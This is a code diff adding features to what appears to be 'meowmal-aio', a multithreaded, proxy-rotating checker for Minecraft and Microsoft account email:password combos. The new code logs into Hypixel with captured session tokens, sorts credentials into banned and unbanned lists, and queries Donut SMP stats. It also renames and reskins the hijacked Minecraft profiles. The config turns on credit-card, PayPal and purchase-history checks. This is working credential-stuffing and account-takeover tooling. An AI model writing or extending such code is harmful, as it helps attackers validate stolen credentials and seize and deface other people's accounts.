@@ -13,6 +13,14 @@ const { HttpsProxyAgent } = require("https-proxy-agent");
 const { SocksProxyAgent } = require("socks-proxy-agent");
 const { logger } = require("./logger");
 
+let mc = null;
+try {
+  mc = require("minecraft-protocol");
+} catch {
+  // minecraft-protocol not installed — ban checking disabled
+}
+const MINECRAFT_AVAILABLE = !!mc;
+
 const log = logger.child("meowmal-aio");
 
 // ── Globals (per-run state, reset each run) ──────────────────
@@ -96,7 +104,7 @@ const config = {
   hypixellastlogin: true,
   hypixelbwstars: true,
   hypixelsbcoins: true,
-  hypixelban: false, // pyCraft not available in Node.js
+  hypixelban: MINECRAFT_AVAILABLE,
   optifinecape: true,
   optifine_cape: true,
   access: true,
@@ -120,7 +128,8 @@ const config = {
   setname: false,
   setskin: false,
   save_bad: true,
-  donut_stats: false,
+  donut_stats: true,
+  donut_api_key: "",
   check_credit_cards: true,
   check_paypal: true,
   check_purchase_history: true,
@@ -1661,7 +1670,295 @@ function buildCaptureLine(c) {
   return line;
 }
 
-// ── Full handle (from Capture.handle in meow.py) ─────────────
+// ── Hypixel Ban Check (1:1 port of Capture.ban from meow.py) ──
+
+const DONUT_API_URL = "https://api.donutsmp.net/v1/stats/";
+
+let banproxies = [];
+
+function loadBanProxies() {
+  try {
+    const bp = path.join(__dirname, "..", "..", "banproxies.txt");
+    if (fs.existsSync(bp)) {
+      banproxies = fs.readFileSync(bp, "utf-8").split("\n").map(l => l.trim()).filter(Boolean);
+    }
+  } catch {}
+}
+
+async function checkBan(name, uuid, token) {
+  if (!MINECRAFT_AVAILABLE || !config.hypixelban) return null;
+  if (!name || name === "N/A" || !token) return null;
+
+  let banned = null;
+  let tries = 0;
+
+  while (tries < maxretries) {
+    try {
+      const client = mc.createClient({
+        host: "mc.hypixel.net",
+        port: 25565,
+        username: name,
+        session: {
+          accessToken: token,
+          selectedProfile: { id: uuid, name },
+        },
+        auth: "manual",
+        version: "1.8.9",
+        hideErrors: true,
+        skipValidation: true,
+      });
+
+      banned = await new Promise((resolve) => {
+        const timeout = setTimeout(() => {
+          try { client.end(); } catch {}
+          resolve("[Error] Connection Timeout/No Packet");
+        }, 30000);
+
+        client.on("disconnect", (packet) => {
+          clearTimeout(timeout);
+          try {
+            const data = JSON.parse(packet.reason);
+            const dataStr = JSON.stringify(data);
+
+            if (dataStr.includes("temporarily banned")) {
+              try {
+                const duration = data.extra[4].text.trim();
+                const banId = data.extra[8].text.trim();
+                resolve(`[${data.extra[1].text}] ${duration} Ban ID: ${banId}`);
+              } catch {
+                resolve("Temporarily Banned");
+              }
+              return;
+            }
+            if (dataStr.includes("Suspicious activity")) {
+              try {
+                const banId = data.extra[6].text.trim();
+                resolve(`[Permanently] Suspicious activity has been detected on your account. Ban ID: ${banId}`);
+              } catch {
+                resolve("[Permanently] Suspicious activity");
+              }
+              return;
+            }
+            if (dataStr.includes("You are permanently banned from this server!")) {
+              try {
+                const reason = data.extra[2].text.trim();
+                const banId = data.extra[6].text.trim();
+                resolve(`[Permanently] ${reason} Ban ID: ${banId}`);
+              } catch {
+                resolve("[Permanently] Banned");
+              }
+              return;
+            }
+            if (dataStr.includes("The Hypixel Alpha server is currently closed!") ||
+                dataStr.includes("Failed cloning your SkyBlock data")) {
+              resolve("False");
+              return;
+            }
+
+            const extraList = data.extra || [];
+            let fullMsg = extraList.filter(x => typeof x === "object").map(x => x.text || "").join("");
+            if (!fullMsg) fullMsg = data.text || "";
+            resolve(fullMsg || JSON.stringify(data));
+          } catch (e) {
+            resolve(`Error parsing ban: ${e.message}`);
+          }
+        });
+
+        client.on("login", () => {
+          clearTimeout(timeout);
+          resolve("False");
+          setTimeout(() => { try { client.end(); } catch {} }, 1000);
+        });
+
+        client.on("position", () => {
+          clearTimeout(timeout);
+          if (banned === null) {
+            resolve("False");
+            setTimeout(() => { try { client.end(); } catch {} }, 1000);
+          }
+        });
+
+        client.on("error", (err) => {
+          clearTimeout(timeout);
+          const errStr = String(err);
+          if (errStr.includes("RateLimiter") || errStr.includes("429")) {
+            resolve("[Error] Rate Limit");
+          } else if (errStr.includes("multiplayer.access.banned")) {
+            resolve(`[Ban] ${errStr}`);
+          } else {
+            resolve(`[Error] ${errStr.slice(0, 120)}`);
+          }
+        });
+      });
+
+      if (banned && !String(banned).startsWith("[Error]")) break;
+      if (banned && String(banned).startsWith("[Error]") && tries < maxretries - 1) {
+        banned = null;
+        await sleep(1000);
+        tries++;
+        continue;
+      }
+      break;
+    } catch (e) {
+      banned = `[Error] ${String(e.message || e).slice(0, 120)}`;
+      if (tries < maxretries - 1) {
+        banned = null;
+        await sleep(1000);
+      }
+      tries++;
+    }
+  }
+
+  return banned;
+}
+
+// ── Donut SMP Stats (1:1 port from meow.py) ──────────────────
+
+function formatSeconds(totalSec) {
+  try {
+    let s = parseInt(totalSec);
+    if (s < 0) s = 0;
+    const days = Math.floor(s / 86400); s %= 86400;
+    const hours = Math.floor(s / 3600); s %= 3600;
+    const minutes = Math.floor(s / 60);
+    const secs = s % 60;
+    const parts = [];
+    if (days) parts.push(`${days}d`);
+    if (hours) parts.push(`${hours}h`);
+    if (minutes) parts.push(`${minutes}m`);
+    if (!parts.length) parts.push(`${secs}s`);
+    return parts.join(" ");
+  } catch { return String(totalSec); }
+}
+
+async function checkDonutSmp(name) {
+  if (!config.donut_stats || !name || name === "N/A") return null;
+
+  const headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    Accept: "application/json",
+  };
+  if (config.donut_api_key) headers.Authorization = `Bearer ${config.donut_api_key}`;
+
+  let response = null;
+  const proxyCandidates = [];
+  if (!isNoProxy()) {
+    for (let i = 0; i < 4; i++) {
+      const p = getProxy();
+      if (p) proxyCandidates.push(p);
+    }
+  }
+  proxyCandidates.push(null);
+  const unique = [];
+  const seen = new Set();
+  for (const p of proxyCandidates) {
+    const k = JSON.stringify(p);
+    if (!seen.has(k)) { seen.add(k); unique.push(p); }
+  }
+
+  for (let idx = 0; idx < unique.length; idx++) {
+    try {
+      const opts = { headers, signal: AbortSignal.timeout(20000) };
+      const p = unique[idx];
+      if (p) opts.agent = makeAgent(p);
+      const r = await fetch(`${DONUT_API_URL}${name}`, opts);
+      await sleep(300 * (idx + 1));
+      if (r.status === 200 || [401, 404, 429].includes(r.status)) {
+        response = r;
+        break;
+      }
+    } catch { continue; }
+  }
+
+  if (!response || response.status !== 200) return null;
+
+  try {
+    const data = await response.json();
+    let statsData = null;
+    if (data && typeof data === "object") {
+      if (data.result && typeof data.result === "object") statsData = data.result;
+    }
+    if (!statsData) return null;
+
+    const lines = [];
+    if (statsData.broken_blocks) lines.push(`broken_blocks: ${statsData.broken_blocks}`);
+    if (statsData.deaths) lines.push(`deaths: ${statsData.deaths}`);
+    if (statsData.kills) lines.push(`kills: ${statsData.kills}`);
+    if (statsData.mobs_killed) lines.push(`mobs_killed: ${statsData.mobs_killed}`);
+    if (statsData.money) lines.push(`money: ${statsData.money}`);
+    if (statsData.money_made_from_sell) lines.push(`money_made_from_sell: ${statsData.money_made_from_sell}`);
+    if (statsData.money_spent_on_shop) lines.push(`money_spent_on_shop: ${statsData.money_spent_on_shop}`);
+    if (statsData.placed_blocks) lines.push(`placed_blocks: ${statsData.placed_blocks}`);
+    if (statsData.playtime) {
+      try {
+        const fmt = formatSeconds(statsData.playtime);
+        lines.push(`playtime: ${statsData.playtime} (${fmt})`);
+      } catch { lines.push(`playtime: ${statsData.playtime}`); }
+    }
+    return { lines, raw: statsData };
+  } catch { return null; }
+}
+
+// ── Set Name (1:1 port from meow.py Capture.setname) ─────────
+
+async function setMcName(token, currentName) {
+  if (!config.setname) return null;
+  const nameFormat = config.name || "MeowMal";
+  let newname = nameFormat;
+  while (newname.includes("{random_letter}"))
+    newname = newname.replace("{random_letter}", String.fromCharCode(97 + Math.floor(Math.random() * 26)));
+  while (newname.includes("{random_number}"))
+    newname = newname.replace("{random_number}", String(Math.floor(Math.random() * 10)));
+  while (newname.includes("{random_string}")) {
+    const rs = Array.from({ length: 3 }, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join("");
+    newname = newname.replace("{random_string}", rs);
+  }
+  if (newname === nameFormat && newname.length < 13) {
+    const suf = Array.from({ length: 3 }, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join("");
+    newname = `${newname}_${suf}`;
+  }
+
+  let tries = 0;
+  while (tries < maxretries) {
+    try {
+      const r = await fetch(`https://api.minecraftservices.com/minecraft/profile/name/${newname}`, {
+        method: "PUT",
+        headers: { Authorization: `Bearer ${token}` },
+        signal: AbortSignal.timeout(10000),
+      });
+      if (r.status === 200) return { newName: newname, tag: " [SET MC]" };
+      if (r.status === 429) await sleep(500);
+    } catch {}
+    tries++;
+  }
+  return null;
+}
+
+// ── Set Skin (1:1 port from meow.py Capture.setskin) ─────────
+
+async function setMcSkin(token) {
+  if (!config.setskin) return false;
+  const skinUrl = config.skin || "http://textures.minecraft.net/texture/31f477eb1a7beee631c2ca64d06f8f68fa93a3386d04452ab27f43acdf1b60cb";
+  const variant = config.variant || "classic";
+
+  let tries = 0;
+  while (tries < maxretries) {
+    try {
+      const r = await fetch("https://api.minecraftservices.com/minecraft/profile/skins", {
+        method: "POST",
+        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+        body: JSON.stringify({ url: skinUrl, variant }),
+        signal: AbortSignal.timeout(10000),
+      });
+      if (r.status === 200) return true;
+      if (r.status === 429) await sleep(500);
+    } catch {}
+    tries++;
+  }
+  return false;
+}
+
+
 
 async function handleCapture(email, password, name, capes, uuid, token, type, jar) {
   const c = {
@@ -1708,8 +2005,40 @@ async function handleCapture(email, password, name, capes, uuid, token, type, ja
       if (nc.namechangeAvailable) stats.name_changes++;
     } catch { stats.errors++; }
 
-    // Ban check: pyCraft not available in Node.js — skip functional part
-    // c.banned stays null → [Unknown]
+    // Ban check via minecraft-protocol (1:1 port of pyCraft logic)
+    try {
+      c.banned = await checkBan(name, uuid, token);
+      if (c.banned && c.banned !== "False" && !String(c.banned).startsWith("[Error]")) {
+        stats.banned++;
+        results_banned.push(`${email}:${password}`);
+      } else if (c.banned === "False") {
+        stats.unbanned++;
+        results_unbanned.push(`${email}:${password}`);
+      }
+    } catch { stats.errors++; }
+
+    // Donut SMP stats
+    try {
+      const donut = await checkDonutSmp(name);
+      if (donut && donut.lines && donut.lines.length) {
+        c.donut = donut;
+      }
+    } catch { stats.errors++; }
+
+    // Set Name
+    try {
+      const nameResult = await setMcName(token, name);
+      if (nameResult) {
+        c.type = (c.type || "") + nameResult.tag;
+        c.name = c.name + ` -> ${nameResult.newName}`;
+      }
+    } catch { stats.errors++; }
+
+    // Set Skin
+    try {
+      const skinResult = await setMcSkin(token);
+      if (skinResult) c.type = (c.type || "") + " [SET SKIN]";
+    } catch { stats.errors++; }
 
     // Microsoft features
     try {
@@ -2006,6 +2335,7 @@ async function runAioCheck(combos, threads = 30, onProgress, signal) {
   resetStats();
   resetResults();
   loadAioProxies();
+  loadBanProxies();
 
   stats.total = combos.length;
   maxretries = config.max_retries;
